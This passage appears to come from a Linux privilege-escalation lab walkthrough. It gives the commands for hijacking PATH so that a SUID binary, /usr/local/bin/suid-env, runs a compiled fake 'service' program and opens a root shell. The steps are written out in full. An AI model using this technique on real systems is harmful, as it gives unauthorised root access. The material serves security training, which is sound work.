The **/usr/local/bin/suid-env** executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

**First, execute the file and note that it seems to be trying to start the apache2 webserver:**
```python
/usr/local/bin/suid-env
```

**Run strings on the file to look for strings of printable characters:**
```python
strings /usr/local/bin/suid-env
```
One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

**Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:**
```python
gcc -o service /home/user/tools/suid/service.c
```

**Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:**
```python
PATH=.:$PATH /usr/local/bin/suid-env
```
